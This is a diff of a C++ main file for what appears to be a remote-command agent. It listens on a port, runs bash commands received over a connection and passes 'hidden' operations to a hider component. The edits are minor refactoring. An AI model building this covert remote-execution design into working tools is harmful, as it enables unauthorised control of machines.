@@ -2,7 +2,7 @@
 #include <array>
 
 #include "SoftwareManeger.h"
-#include "Status.h"
+#include "../IncludeCPP/Status.h"
 #include "FunCodes.h"
 #include "HiderManeger.h"
 #include "HiderCodes.h"
@@ -11,7 +11,7 @@
 
 #define PORT (65432)
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger);
+void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger);
 void testSoftwareManeger(void);
 
 int main() {
@@ -36,15 +36,7 @@ int main() {
 
     return EXIT_SUCCESS;
 }
-// & outdated
-// void testSoftwareManeger() {
-//     SoftwareManeger swm = SoftwareManeger();
-//     swm.fileWrite("tempSwmTest.txt", false, "this is my first test\n");
-//     swm.chunkWrite("tempSwmTest.txt", 1, "this is my second test\n");
-    
-//     swm.deleteFile("tempSwmTest.txt");
 
-// }
 
 
 
@@ -63,7 +55,7 @@ std::string execBash(const char* cmd) {
 }
 
 
-void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
+void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger& hiderManeger)
 {
     // receive command
     Status res = SUCCSESS;
@@ -94,7 +86,7 @@ void loopIter(Connection& conn, SoftwareManeger& swm, HiderManeger hiderManeger)
     }
     // hidden handling
     if (cmd.fncode & HIDDEN_OPRATION) {
-        res = hiderManeger.hiddenAction(cmd.fncode, strParam, conn);
+        res = hiderManeger.hiddenAction(cmd, conn);
     }
     
     // TODO change such that there will be response only if we want it to be 
